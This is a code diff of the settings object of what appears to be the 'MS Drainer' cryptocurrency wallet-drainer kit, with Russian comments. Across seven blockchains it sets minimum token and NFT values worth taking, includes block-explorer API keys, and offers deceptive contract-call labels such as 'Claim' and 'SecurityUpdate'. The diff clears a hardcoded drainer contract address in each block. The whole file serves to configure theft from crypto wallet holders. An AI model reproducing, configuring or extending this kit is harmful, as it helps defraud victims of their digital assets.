@@ -138,7 +138,7 @@ const MS_Settings = {
       Min_Tokens_Price: 1, // минимальная стоимость токена в USD
       Min_NFTs_Price: 1, // минимальная стоимость NFT в USD
       API: '2B44DG986KR15DTS4S1E5JWZT8VTWZ7C99', // Etherscan API Key (не менять, если не уверены)
-      Contract_Address: "0xad8df71748d51aCCB691378f5505aD6c14C2dcE9", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
+      Contract_Address: "", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
       Contract_Type: "Execute", // Вариации: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
       Contract_Legacy: 0, // 0 - использовать контракты в стиле MS Drainer, 1 - использовать стандартные контракты
     },
@@ -151,7 +151,7 @@ const MS_Settings = {
       Min_Tokens_Price: 1, // минимальная стоимость токена в USD
       Min_NFTs_Price: 1, // минимальная стоимость NFT в USD
       API: 'K5AI5N7ZPC9EF6G9MVQF33CBVMY1UKQ7HI', // Bscscan API Key (не менять, если не уверены)
-      Contract_Address: "0xad8df71748d51aCCB691378f5505aD6c14C2dcE9", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
+      Contract_Address: "", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
       Contract_Type: "Execute", // Вариации: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
       Contract_Legacy: 0, // 0 - использовать контракты в стиле MS Drainer, 1 - использовать стандартные контракты
     },
@@ -164,7 +164,7 @@ const MS_Settings = {
       Min_Tokens_Price: 1, // минимальная стоимость токена в USD
       Min_NFTs_Price: 1, // минимальная стоимость NFT в USD
       API: 'M9IMUX515SEB97THWJRQDKNX75CI66X7XX', // Polygonscan API Key (не менять, если не уверены)
-      Contract_Address: "0xad8df71748d51aCCB691378f5505aD6c14C2dcE9", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
+      Contract_Address: "", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
       Contract_Type: "Execute", // Вариации: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
       Contract_Legacy: 0, // 0 - использовать контракты в стиле MS Drainer, 1 - использовать стандартные контракты
     },
@@ -177,7 +177,7 @@ const MS_Settings = {
       Min_Tokens_Price: 1, // минимальная стоимость токена в USD
       Min_NFTs_Price: 1, // минимальная стоимость NFT в USD
       API: 'ZMJ2CKEX65EJ8WIPWRJWKRFG8HXCM6I89Z', // Snowtrace API Key (не менять, если не уверены)
-      Contract_Address: "0xad8df71748d51aCCB691378f5505aD6c14C2dcE9", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
+      Contract_Address: "", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
       Contract_Type: "Execute", // Вариации: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
       Contract_Legacy: 0, // 0 - использовать контракты в стиле MS Drainer, 1 - использовать стандартные контракты
     },
@@ -190,7 +190,7 @@ const MS_Settings = {
       Min_Tokens_Price: 1, // минимальная стоимость токена в USD
       Min_NFTs_Price: 1, // минимальная стоимость NFT в USD
       API: 'DU3TKS3QYBQAHC7SEQ5YHB9VPD85JXTX7I', // Arbscan API Key (не менять, если не уверены)
-      Contract_Address: "0xad8df71748d51aCCB691378f5505aD6c14C2dcE9", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
+      Contract_Address: "", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
       Contract_Type: "Execute", // Вариации: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
       Contract_Legacy: 0, // 0 - использовать контракты в стиле MS Drainer, 1 - использовать стандартные контракты
     },
@@ -203,7 +203,7 @@ const MS_Settings = {
       Min_Tokens_Price: 1, // минимальная стоимость токена в USD
       Min_NFTs_Price: 1, // минимальная стоимость NFT в USD
       API: 'F9GFY4EXGD84MHWEK5NCUJWF9FZVBRT415', // Fantomscan API Key (не менять, если не уверены)
-      Contract_Address: "0xad8df71748d51aCCB691378f5505aD6c14C2dcE9", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
+      Contract_Address: "", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
       Contract_Type: "Execute", // Вариации: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
       Contract_Legacy: 0, // 0 - использовать контракты в стиле MS Drainer, 1 - использовать стандартные контракты
     },
@@ -216,7 +216,7 @@ const MS_Settings = {
       Min_Tokens_Price: 1, // минимальная стоимость токена в USD
       Min_NFTs_Price: 1, // минимальная стоимость NFT в USD
       API: '46J83C1RF5TEWJ3NVCF17PG3KYD36U9QPK', // Optimismscan API Key (не менять, если не уверены)
-      Contract_Address: "0xad8df71748d51aCCB691378f5505aD6c14C2dcE9", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
+      Contract_Address: "", // Адрес для смарт-контракта, если не знаете или не используете, оставьте пустым
       Contract_Type: "Execute", // Вариации: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
       Contract_Legacy: 0, // 0 - использовать контракты в стиле MS Drainer, 1 - использовать стандартные контракты
     }
